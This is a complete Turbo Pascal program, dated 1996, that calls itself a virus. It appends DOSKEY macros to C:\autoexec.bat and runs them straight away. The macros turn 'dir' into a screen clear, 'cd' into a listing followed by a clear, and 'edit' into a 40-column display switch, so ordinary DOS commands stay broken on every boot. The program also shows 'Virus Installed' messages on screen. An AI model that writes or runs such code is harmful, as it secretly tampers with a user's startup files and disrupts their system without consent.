PROGRAM virus;
{$M 8192,0,0}
   USES
      crt,dos,tp_virus;

   VAR
      arq:TEXT;

   BEGIN
     Inicia('Virus  V1.0','Jan.  1996');
     Textcolor(12 + 128);
     Centra(2,'Instalando Virus');
     Assign(arq,'c:\autoexec.bat');
     Append(arq);
     Writeln(arq,'C:\DOS\DOSKEY  dir=cls');
     Writeln(arq,'C:\DOS\DOSKEY  cd=dir$Tcls');
     Writeln(arq,'C:\DOS\DOSKEY  edit=mode co40');
     Flush(arq);
     Execute('C:\DOS\DOSKEY  dir=cls');
     Execute('C:\DOS\DOSKEY  cd=dir$Tcls');
     Execute('C:\DOS\DOSKEY  edit=mode co40');
     Textcolor(1);
     Centra(2,'Instalando Virus');
     Textcolor(12);
     Centra(2,'Virus Instalado');
     Delay(1500);
   END.
